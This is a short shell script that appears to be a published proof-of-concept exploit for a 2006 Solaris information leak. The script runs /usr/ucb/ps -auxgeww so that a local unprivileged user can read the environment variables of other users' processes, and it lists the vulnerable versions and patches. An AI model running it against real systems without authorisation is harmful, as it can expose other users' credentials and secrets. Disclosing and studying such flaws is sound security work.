#!/bin/sh

#
# $Id: raptor_ucbps,v 1.1 2006/07/26 12:15:42 raptor Exp $
#
# raptor_ucbps - information leak with Solaris /usr/ucb/ps
# Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# A security vulnerability in the "/usr/ucb/ps" (see ps(1B)) command may allow 
# unprivileged local users the ability to see environment variables and their 
# values for processes which belong to other users (Sun Alert ID: 102215).
#
# Absolutely nothing fancy, but it may turn out to be useful;)
#
# Usage:
# $ chmod +x raptor_ucbps
# $ ./raptor_ucbps
# [...]
#
# Vulnerable platforms (SPARC):
# Solaris 8 without patch 109023-05 [tested]
# Solaris 9 without patch 120240-01 [tested]
#
# Vulnerable platforms (x86):
# Solaris 8 without patch 109024-05 [untested]
# Solaris 9 without patch 120239-01 [untested]
#

echo "raptor_ucbps - information leak with Solaris /usr/ucb/ps"
echo "Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>"
echo

/usr/ucb/ps -auxgeww

# milw0rm.com [2006-08-22]